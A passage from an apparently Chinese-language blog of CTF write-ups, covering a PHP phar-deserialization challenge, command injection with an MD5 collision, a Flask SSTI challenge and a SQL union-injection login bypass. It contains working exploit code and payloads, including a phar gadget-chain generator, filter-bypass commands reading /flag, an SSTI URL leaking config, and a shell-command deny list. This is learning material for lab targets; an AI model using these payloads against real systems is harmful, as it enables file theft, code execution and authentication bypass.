&amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;</span><br><span class="line">        if ($u-&gt;add_user($username, $password)) &#123;</span><br><span class="line">            echo(&quot;&lt;script&gt;window.location.href=&apos;login.php?register&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;toast(&apos;姝ょ敤鎴峰悕宸茶浣跨敤&apos;, &apos;warning&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&apos;璇疯緭鍏ユ湁鏁堢敤鎴峰悕鍜屽瘑鐮�&apos;, &apos;warning&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>login.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&apos;login&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;register&apos;])) &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&apos;娉ㄥ唽鎴愬姛&apos;, &apos;info&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u = new User();</span><br><span class="line">    $username = (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password = (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class="line">        $_SESSION[&apos;login&apos;] = true;</span><br><span class="line">        $_SESSION[&apos;username&apos;] = htmlentities($username);</span><br><span class="line">        $sandbox = &quot;uploads/&quot; . sha1($_SESSION[&apos;username&apos;] . &quot;sftUahRiTz&quot;) . &quot;/&quot;;</span><br><span class="line">        if (!is_dir($sandbox)) &#123;</span><br><span class="line">            mkdir($sandbox);</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&apos;sandbox&apos;] = $sandbox;</span><br><span class="line">        echo(&quot;&lt;script&gt;window.location.href=&apos;index.php&apos;;&lt;/script&gt;&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&apos;璐﹀彿鎴栧瘑鐮侀敊璇�&apos;, &apos;warning&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
一开始我自己看这么多代码的时候是懵逼的。每个文件都看了一下大概的意思。<br>因为文件下载的时候过滤了flag这个关键字。所以不可以利用任意文件下载直接下载/flag.txt(我也不知道大佬们是怎么知道flag在这的)<br>然后继续看wp。说是利用phar。好了，我不知道phar是什么东西。看看大佬是怎么说的 <a href="https://xz.aliyun.com/t/6753#toc-13" target="_blank" rel="noopener">传送门</a><br>先看看phar组成结构<br><img src="https://i.loli.net/2020/03/18/W3HjeiudgzLbXw1.png" alt="Snipaste_2020-03-18_17-46-11.png"><br>顺便再截图一下利用条件和受影响的函数表<br><img src="https://i.loli.net/2020/03/18/ZrQqilfyOhMU3TP.png" alt="Snipaste_2020-03-18_17-48-28.png"><br>条件有三个：</li>
<li>phar文件需要上传到服务端</li>
<li>要有可用的魔术方法作为“跳板”</li>
<li>文件操作函数的参数可用(就是那些受影响的函数参数可控，不然我们怎么让函数打开php://xxx)。还要求/,phar等字符没被过滤<br>这道题跟着做了一遍，总算是理解了为啥说需要这三个条件，真是缺一不可。<br>首先来审计一下class.php这个文件<br>我一开始是无脑往下看完，虽然大概知道了都是要干嘛要干嘛，但是感觉其实不得精髓。<br>大佬们审计代码好像都是先扫一眼看看有没有可利用函数。<br>比如这题，大佬们的思路是先定位到File类中的close函数，因为里面有个可利用的危险函数file_get_contents<br>并且File的成员名filename是我们可以控制的.那让close函数跑起来就有可能得到flag了。<br>但是，问题来了。我们要怎么触发close函数呢？<br>前面图片里提到，phar反序列化漏洞的形成原因是文件操作数通过phar://伪协议解析phar文件的时候反序列化形成的。<br>而我们利用这个漏洞的方式就是把我们自己定义的元数据放到phar文件的元数据里面去。让元数据被反序列化。<br>但是被反序列化了，我们又不能调用这个对象的函数，有啥用呢？</li>
</ul>
<p><strong>这里就不得不提到phar利用的第二个条件，有魔术方法当跳板</strong><br>我们不能直接执行，就利用魔术方法来帮我们执行，比如<strong>desctruct函数里有个危险方法。那我们只要想办法将这个类的对象反序列化出来。<br>程序允许结束的时候就会执行这个类的析构函数，执行危险函数。从而达到利用魔术方法当跳板的作用。<br>而本题我们利用的跳板有两个，一个是User类的</strong>destruct.一个是FileList类的<strong>call魔术方法。<br>一开始的话感觉只需要利用User类就行了。因为User类的析构函数会调用$this-&gt;db-close();<br>我们只要在本地生成一个phar文件，然后让存储的元数据是一个User类对象。这个对象的db是一个File类。就能想办法利用file_get_contents函数来读取文件。<br>但是这个方法实际上没有回显。读取到了也看不到。<br>那这里还需要再利用FileList类的</strong>call魔术方法。<br>看看这里魔术方法是干嘛用的：<a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/03/18/3OVdtqzQMbnWsBF.png" alt="Snipaste_2020-03-18_18-36-39.png"><br>概括一下就是设置了这个魔术方法的话，当类调用不存在的方法的时候，就会执行这个<strong>call魔术方法。<br>可以看到class.php的_call方法有一个循环，对数组(数组里都是File类的对象)。<br>那如果FileList有个对象叫test调用了close方法。那FileList类本身没有这个方法。就会去调用</strong>call魔术方法。<br>而这个魔术方法对存储了File类对象的数组进行了一个遍历，将$file-&gt;func()执行的结果保存了起来。也就是把File-&gt;close()的执行结果保存起来。<br>到这里，我们就组成了一条完整的调用链。<br>利用User的魔术方法调用close方法。偷梁换柱把db换成FileList类，就会触发<strong>call方法，而</strong>call方法又会把File对象的close执行结果保存起来。随后FileList类的析构函数被调用，结果被打印出来。<br>那就可以写exp来创建phar文件了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	class User&#123;</span><br><span class="line">		public $db;</span><br><span class="line">	&#125;</span><br><span class="line">	class File&#123;</span><br><span class="line">		public $filename = &apos;/flag.txt&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	class FileList&#123;</span><br><span class="line">		private $files;</span><br><span class="line">		private $results;</span><br><span class="line">		private $funcs;</span><br><span class="line">		public function __construct()&#123;</span><br><span class="line">			$this-&gt;files=array(new File());</span><br><span class="line">			$this-&gt;funcs=array();</span><br><span class="line">			$this-&gt;results=array();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// phar文件生成</span><br><span class="line">	$u = new User();</span><br><span class="line">	$u-&gt;db = new Filelist(); //把user的db设置为Filelist对象,通过__call魔术方法来让File对象执行close包含目标文件。并且用__destruct魔术方法回显出来。</span><br><span class="line">	@unlink(&quot;phar.phar&quot;);</span><br><span class="line">	$phar = new Phar(&quot;phar.phar&quot;); //生成的时候后缀名必须为phar</span><br><span class="line">	$phar-&gt;startBuffering(); </span><br><span class="line">	$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">	$phar-&gt;setMetadata($u); //将自定义的元数据存入manifest</span><br><span class="line">	$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件</span><br><span class="line">	$phar-&gt;stopBuffering(); //签名自动计算</span><br><span class="line">	rename(&apos;phar.phar&apos;,&apos;phar.gif&apos;);</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里主要把php.ini中phar.readonly设置为off。运行一下就得到了一个phar.gif.<br>这里再注意一下。Phar文件只是创建的时候必须把后缀名设置为.phar,但是你创建出来之后设置什么扩展名都可以。<br>因为php通过phar伪协议解析phar文件的时候是通过stub头来认的。</p>
<blockquote>
<p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件<br>那我们就可以把.phar改成.gif,.png等文件名来上传。</p>
</blockquote>
<hr>
<p>但是上传了还没完啊，我们创建的对象元数据还没反序列化呢，这样的话也不能成功触发魔术方法啊。<br>所以接下来是找到一个点来让我们的phar文件成功反序列化出来。前面的图片里已经列出了解析phar伪协议的时候会触发反序列化的一些函数。<br>找找看发现File类的open方法里里有个file_exist函数。这个函数是会触发phar伪协议的反序列化的。<br>那看看有哪里调用了这个open方法。发现download.php和delete.php都有调用open方法检查文件是否存在。<br>那这里就有办法让文件被反序列化然后触发魔术方法来获取文件内容了。<br>上传我们的phar文件<br>然后删除的时候抓包改包(文件名要phar://phar.gif)才能触发解析的时候的反序列化。<br><img src="https://i.loli.net/2020/03/18/3IalFmNLZo7QTSq.png" alt="Snipaste_2020-03-18_19-09-01.png"><br>到这里就成功拿到flag了。<br>不过这里虽然download.php和delete.php都能触发反序列化，但是在download.php中抓包改包是没办法拿到flag的。<br>参见大佬wp，<a href="https://blog.csdn.net/weixin_44077544/article/details/102844554" target="_blank" rel="noopener">传送门</a><br>原因如下:<br><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code> download.php中这一句限制了访问的范围</p>
<blockquote>
<p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。解释了为什么要在delete.php中利用payload，而不是download.php。</p>
</blockquote>
<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>这道题真是学到好多。最大的知识点是学到了phar伪协议的使用。这点真的是从无到有。<br>自己写了一下生成phar文件的代码。走了一遍。真的是加深了自己的理解。<br>可以说是学到很多。非常谢谢各位写wp的，分享资料的表哥。谢谢招待。</p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>知识点</p>
<ul>
<li>文件包含</li>
<li>md5碰撞</li>
<li>rce</li>
<li>fuzz</li>
</ul>
<hr>
<p>进去的url是这样的<code>http://a9bcb42a-d37d-4bb2-ac6a-216cfb57288c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code><br>f12刷新一下看看。发现背景图片是另外请求的。img=xx这段好像有点问题。<br>看着像base64编码。拿去解密了两次。得到一个16进制字符串(然后我就不会了)。<br>看到提示了md5 is funny还以为这是md5摘要呢。一看数量也不对啊(看wp)</p>
<hr>
<p>ok，做题的方向是没问题。但是菜是真的菜。那串16进制的数字是偶数个的。从二进制字符串转过来的。<br>一个字符转两个16进制数字表示ascii码。<br>这里直接用wp的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">filename = input().encode(encoding=&apos;utf-8&apos;)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">base1 = base64.b64encode(hex)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line">print(base2.decode())</span><br></pre></td></tr></table></figure>
<p>然后去包含一下index.php的内容。这里又做错了(所以说我为什么这么菜)。<br>一开始我以为是要php://filter/read=convert.base64-encode/resource=index.php送去加密的。<br>后来发现不行。<br>这其实是自己没动脑子想偷懒。页面返回的明明是base64编码的数据了。后端就不是include包含的，而是base64_encode(file_get_contents(filename))的形式来包含的.<br>后面还是用index.php编码了一下成功读到了base64的数据。解密一下，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) </span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现要执行命令需要绕过正则和满足一个md5碰撞。<br>先说md5碰撞的时候自己遇到的问题。<br>我用postman，使用如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<p>打了几遍发现命令没成功执行。找问题所在。<br>发现postman选择x-www-form-urlencoded这个模式的时候，<br>会把打上去的payload用url编码一遍。这样payload就失效了。<br>这里我用bp抓包然后再手动修改为原payload的方式解决了问题。<br>顺便实验了一把。raw之所以打上去不成功。是因为mime头的问题。mime头要为application/x-www-form-urlencoded才能结构解析payload。<br>最后是绕过正则执行命令的问题。这里师傅说正则没写好导致\逃逸了。<br>所以cmd处的payload可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l\s%20/</span><br><span class="line">ca\t%20/flag</span><br></pre></td></tr></table></figure>
<p>来找文件和读文件。<br>虽然这样拿到了flag。但是如果\没有逃逸呢？该怎么找到并且读取flag？<br>官方wp给了一个读命令 sort /flag。但是要怎么找呢。翻翻找找找到了一个dir命令。这也是可以列出目录文件的命令。又学到了。<br>这样的话就算本题\被过滤了也没关系。用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir /</span><br><span class="line">sour /flag</span><br></pre></td></tr></table></figure>
<p>的方式来查找，读取flag就好了。<br>但是正则这个地方也是。有点疑惑的。我把这个规则拿去在线试了一下。发现是可以匹配到\的。但是实际执行的时候又没过滤掉。有点懵。<br>顺便，其实这个正则表达式过滤的东西不也是很有价值的吗。肯定是一堆常规的查看查找文件命令。学习一下美滋滋。</p>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>这道题还是学到了不少东西的。md5碰撞的时候为什么不成功。原来是因为mime头对和payload编码后不对(分别对应postman的raw和x-www-form-urlencoded上传体)<br>还有就是文件名编码的问题。只知道解码到16进制字符串。只差一步就能成功利用文件包含了。还是知识面太狭窄了。<br>最后还是没有发现如果\被过滤情况下的题解，有点遗憾。</p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>知识点<br>ssti</p>
<hr>
<p>进去直接给了源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"># app.config[&apos;FLAG&apos;] = os.environ.pop(&apos;FLAG&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/shrine/&lt;path:shrine&gt;&apos;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&apos;(&apos;, &apos;&apos;).replace(&apos;)&apos;, &apos;&apos;)#过滤()</span><br><span class="line">        blacklist = [&apos;config&apos;, &apos;sealf&apos;]</span><br><span class="line">        return &apos;&apos;.join([&apos;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&apos;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p>参考了一下搜了一下资料。算是读懂了代码的意思。<a href="https://www.jianshu.com/p/54057b4f0437" target="_blank" rel="noopener">传送门</a><br>看到注入点就是参数了。直接49就能验证这里存在漏洞。<br>在//shrine路径后面的都是参数，path表示参数类型。而shrine是参数名。我们传值的时候不需要指定参数名，传值就好了。<br>因为这个一看就是jinja的注入题。就去搜了一下关于flask的对应ssti文章。还真找到一篇大表哥写的好文<a href="https://zhuanlan.zhihu.com/p/93746437" target="_blank" rel="noopener">传送门</a><br>分析一下代码可以知道。在config里面配置了FLAG。而且过滤了()和self,config.直接用大表哥写好的payload打上去就能拿到flag了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d1127538-ece0-4561-af99-fadfefee7df7.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__[&apos;current_app&apos;].config.FLAG%7D%7D</span><br></pre></td></tr></table></figure>
<h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>这道题其实我还是有一个问题的。那就是这个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;% set &#123;&#125;=None%&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>的过滤，应该是不完整的。因为后面的payload照样有config在里面。也逃过了过滤。<br>这个再找资料看看吧。还有好好看看大表哥的文章。不要拿到flag就完事了，重要的是学到了什么。</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>知识点<br>感觉这道题，还是脑洞大一点吧。</p>
<ul>
<li>查询的数据不存在时。表中只会剩下联合查询的那条记录。<br>本地测试如下：<br><img src="https://i.loli.net/2020/03/19/WHfbrG5ApXNmjzo.png" alt="Snipaste_2020-03-19_20-36-34.png"><br>如果查询的那条记录查不到，返回的表里只会有联合查询部分的数据。</li>
</ul>
<hr>
<p>进入做题部分。不得不说这道题脑洞真的大，如果不是看了wp感觉有以前没注意到的地方我可能就懒得写wp了。<br>进去就是一个登录页面，网页标题写着do you know who am i?猜一个admin。<br>ok提示wrong pass。再随便输一个用户名看看。wrong user。<br>就说明真的有admin这个用户。<br>用 admin ‘ 密码随便填。报错了。那就是有注入点在用户名这里。<br>随便试一下，发现过滤了and,or,().好了，歇菜了。这过滤()的我还真没见过。<br>找了一圈看看有没有过滤()情况下的绕过注入。到这里的时候我还满心欢喜，看来又要学表哥们的技术了。<br>找了一下好像资料很少。直接看wp吧。</p>
<hr>
<p>画风不是我想的那样。在数据提交的那个返回错误信息的页面，有一段注释。<br>经过base32和base64解码之后是如下内容:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &apos;$name&apos;</span><br></pre></td></tr></table></figure>
<p>这，就算你不给我也能猜到后端是这么个东西啊？后来看到表哥们的wp说要根据这条猜后端语句。<br>这里抄一下别人猜的大概逻辑。(据说比赛的时候有提示md5，不过复现这里好像没有)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$row;</span><br><span class="line">$pass=$_POST[&apos;pw&apos;];</span><br><span class="line">if($row[&apos;username&apos;]==’admin’)&#123;</span><br><span class="line">if($row[&apos;password&apos;]==md5($pass))&#123; </span><br><span class="line">echo $flag; </span><br><span class="line">&#125;else&#123; echo “wrong pass!”; </span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123; echo “wrong user!”;&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话。只要我们查出来的用户名为admin,且查出来的哈希值和上传密码的哈希值相等就能得到flag。<br>回到一开始说的地方。<br>我们知道了有个用户叫admin.<br>如果用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; union select 1,2,&apos;3</span><br></pre></td></tr></table></figure>
<p>来注。是会报密码错误的。但是如果我们用这个payload呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irrik&apos; union select 1,2,&apos;3</span><br></pre></td></tr></table></figure>
<p>因为这里查的用户不存在。所以整个表三列对应的数据分别就是1,2,3.<br>报了wrong user。<br>如果用这个payload呢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irrik&apos; union select 1,&apos;admin&apos;,&apos;3</span><br></pre></td></tr></table></figure>
<p>这时候表里的内容就变成了1,’admin’,3.在本题没有报错。说明username这个字段对应了第二列。那password应该对应的就是第三列。<br>根据前面大佬写的后端猜测语句。最后用这个payload就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">irrik&apos; union select 1,&apos;admin&apos;,&apos;202cb962ac59075b964b07152d234b70</span><br><span class="line">密码123</span><br></pre></td></tr></table></figure>
<p>这样就能符合我们猜测的比较语句。</p>
<h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3><p>这道题其实感觉就是开阔了一下自己的，脑洞吧。<br>还有一个自己没注意到的点是，如果查询的数据不存在的时候表里就只剩下联合查询的部分。</p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>知识点</p>
<ul>
<li>.git泄露</li>
<li>无参数RCE</li>
</ul>
<hr>
<p>进去看了一圈发现没什么思路。看就看源码扫后台。<br>一扫扫到了.git泄露。把里面的index.php下载下来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&apos;exp&apos;]))&#123;</span><br><span class="line">    if (!preg_match(&apos;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&apos;, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">        if(&apos;;&apos; === preg_replace(&apos;/[a-z,_]+\((?R)?\)/&apos;, NULL, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">            if (!preg_match(&apos;/et|na|info|dec|bin|hex|oct|pi|log/i&apos;, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">                // echo $_GET[&apos;exp&apos;];</span><br><span class="line">                @eval($_GET[&apos;exp&apos;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span 